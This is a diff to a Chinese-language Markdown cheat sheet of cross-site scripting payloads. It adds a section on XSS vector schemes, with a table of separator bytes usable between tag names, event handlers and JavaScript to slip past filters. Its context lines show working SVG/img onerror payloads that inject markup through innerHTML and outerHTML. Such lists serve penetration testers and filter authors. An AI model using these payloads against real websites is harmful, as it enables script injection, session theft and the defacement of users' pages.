@@ -845,11 +845,32 @@ onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
 ```
 
 **107.Inner & Outer HTML Properties Alternative (内部和外部HTML属性选项)** <br>
-最后这些payload利用元素的innerHTML和outerHTML属性得到与位置向量相同的结果。但是他们需要创建一个完整的HTML向量，而不是一个`javascript:aler(1)`字符串。下面的元素集合可以与索引0一起使用，以便更容易地遵循：`all[0]`、`anchors[0],`、`embed[0]`、`forms[0]`、`images[0]`、`links[0]`和`scripts[0]`。它们都可以替换下面使用的head或body元素。<br>
+最后这些payload利用元素的innerHTML和outerHTML属性得到与位置向量相同的结果。但是他们需要创建一个完整的HTML向量，而不是一个`javascript:aler(1)`字符串。下面的元素集合可以与索引0一起使用，它们都可以替换下面使用的head或body元素,以便更容易地遵循：`all[0]`、`anchors[0],`、`embed[0]`、`forms[0]`、`images[0]`、`links[0]`和`scripts[0]`。<br>
 
 ```
 <svg id=<img/src/onerror&#61alert(1)&gt; onload=head.innerHTML=id>
 <svg id=<img/src/onerror&#61alert(1)&gt; onload=body.outerHTML=id>
+```
+**108.XSS Vector Schemes (XSS向量格式)** <br>
+基本上有3种不同的方案来构建基于HTML的XSS向量。所有字符根据有效语法，用于分隔字段的字节显示在下拉列表中。<br>
+`%x`表示从`%00`到`%0F`的每个字节，以及`%1X`。`ENT`表示HTML实体,这意味着任何允许的字符或字节都可以在它们的HTML实体表单中使用（字符串和数字）。<br>
+最后，注意`javascript`这个词可能有一些字节介于两者之间 <br>
+字符也可以是URL或HTML编码的。 <br>
+Vector Scheme 1 (tag name + handler)
+```
+<name [ ] handler [ ] = [ ] js [ ]>
+      %09         %09   %09    %09
+      %0A         %0A   %0A    %0A
+      %0C         %0C   %0B    %0B
+      %0D         %0D   %0C    %0C
+      %20         %20   %0D    %0D
+      %2F         %20   %20
+      /           %22   %22
+      +           %27   %27
+                  '     '
+                  "     "
+                  +     +
+                  
 ```
 
 ## 致谢
